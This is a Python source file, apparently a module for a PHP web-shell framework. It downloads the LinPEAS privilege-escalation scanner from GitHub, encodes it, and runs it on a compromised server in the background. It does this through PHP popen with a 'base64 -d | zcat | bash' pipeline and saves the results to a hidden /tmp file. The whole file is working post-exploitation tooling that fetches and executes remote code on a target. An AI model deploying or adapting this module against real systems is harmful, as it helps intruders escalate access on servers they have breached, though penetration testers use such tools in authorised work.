import base64
import gzip
import time

from core.vectors import PhpCode
from core.module import Module
from utils.http import request

SCRIPT_URL = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'


class Linpeas(Module):
    """Scan the target system with LinPEAS."""

    script = None

    def init(self):

        self.register_info(
            {
                'author': [
                    'ZanyMonk'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
            {'name': 'arguments', 'help': 'Arguments passed to LinPEAS (default: -a)', 'default': ['-a'], 'nargs': '*'},
            {'name': '-output', 'help': 'Output destination', 'default': None},
        ])

    def run(self):
        if self.script is None:
            try:
                self.get_script()
            except Exception:
                return 'Error: Could not download LinPEAS.'

        if self.args['output'] is None:
            self.args['output'] = '/tmp/.out_' + str(int(time.time()))

        self.args['script'] = self.script.decode('utf-8')

        PhpCode("""
                $c = 'base64 -d | zcat | bash -s -- ${' '.join(arguments)} >> ${output} 2>&1';
                $p = popen($c, 'w');
                fwrite($p, '${script}');
            """,
            name='popen',
            background=True).run(self.args)

        return f"Scan started, output in {self.args['output']}"

    def get_script(self):
        self.script = base64.b64encode(gzip.compress(request(SCRIPT_URL)))
